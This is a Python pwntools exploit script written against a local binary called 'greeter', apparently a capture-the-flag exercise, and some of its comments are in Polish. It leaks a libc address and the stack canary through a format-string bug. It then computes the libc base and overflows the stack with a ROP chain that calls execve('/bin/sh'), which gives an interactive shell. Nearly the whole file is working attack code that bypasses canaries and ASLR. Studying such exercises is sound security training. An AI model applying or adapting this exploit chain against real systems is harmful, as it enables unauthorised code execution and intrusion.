#!/usr/bin/env python2
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template greeter
from pwn import *
from struct import pack

# Set up pwntools for the correct architecture
exe = context.binary = ELF('greeter')
context.terminal = ['tmux', 'splitw', '-h']

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
entry
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      PIE enabled

#print(exe.symbols.main)

io = start()


# %17$p - __libc_start_main+243
# %15$p - canary
# offset do kanarka to 72B wzgledem 2-go payloadu
# offset do retaddr to 88  0x7fffffffd9d8:	0x6161617861616177

fmt = "%17$p.%15$p.\n"

io.recvuntil('Name?\n')
io.send(fmt)
leaked = io.recvuntil('welcome!\n').split('.')

print(leaked)
libc_start_main_243 = int(leaked[0][2:], 16)
canary = int(leaked[1][2:], 16)

print("libc_start_main+243 = {}".format(hex(libc_start_main_243)))
print("canary = {}".format(hex(canary)))


libc_start_main_offset = 0x23bf0
libc_base_addr = libc_start_main_243 - 243 - libc_start_main_offset
print("libc base addr = {}".format(hex(libc_base_addr)))

raw_input("enter to continue")

io.recvuntil('language?')



# ropper -f /usr/lib64/libc-2.29.so --chain "execve cmd=/bin/sh --badbytes=000a0d"


p = lambda x : pack('Q', x)

IMAGE_BASE_0 = libc_base_addr


rebase_0 = lambda x : p(x + IMAGE_BASE_0)

rop = ''

rop += rebase_0(0x0000000000023bc7) # 0x0000000000023bc7: pop r13; ret; 
rop += '//bin/sh'
rop += rebase_0(0x00000000000236a6) # 0x00000000000236a6: pop rdi; ret; 
rop += rebase_0(0x00000000001bf000)
rop += rebase_0(0x000000000005249b) # 0x000000000005249b: mov qword ptr [rdi], r13; pop rbx; pop rbp; pop r12; pop r13; ret; 
rop += p(0xdeadbeefdeadbeef)
rop += p(0xdeadbeefdeadbeef)
rop += p(0xdeadbeefdeadbeef)
rop += p(0xdeadbeefdeadbeef)
rop += rebase_0(0x0000000000023bc7) # 0x0000000000023bc7: pop r13; ret; 
rop += p(0x0000000000000000)
rop += rebase_0(0x00000000000236a6) # 0x00000000000236a6: pop rdi; ret; 
rop += rebase_0(0x00000000001bf008)
rop += rebase_0(0x000000000005249b) # 0x000000000005249b: mov qword ptr [rdi], r13; pop rbx; pop rbp; pop r12; pop r13; ret; 
rop += p(0xdeadbeefdeadbeef)
rop += p(0xdeadbeefdeadbeef)
rop += p(0xdeadbeefdeadbeef)
rop += p(0xdeadbeefdeadbeef)
rop += rebase_0(0x00000000000236a6) # 0x00000000000236a6: pop rdi; ret; 
rop += rebase_0(0x00000000001bf000)
rop += rebase_0(0x000000000002404e) # 0x000000000002404e: pop rsi; ret; 
rop += rebase_0(0x00000000001bf008)
rop += rebase_0(0x00000000001082e5) # 0x00000000001082e5: pop rdx; ret; 
rop += rebase_0(0x00000000001bf008)
rop += rebase_0(0x000000000003a860) # 0x000000000003a860: pop rax; ret; 
rop += p(0x000000000000003b)
rop += rebase_0(0x00000000000b6b39) # 0x00000000000b6b39: syscall; ret; 








_rop = p64(0xdeadbeefdeadbeef) # tu dac one-gadget

#io.sendline(72*'a' + p64(canary) + 8*'b' +  _rop)
io.sendline(72*'a' + p64(canary) + 8*'b' +  rop)

io.interactive()

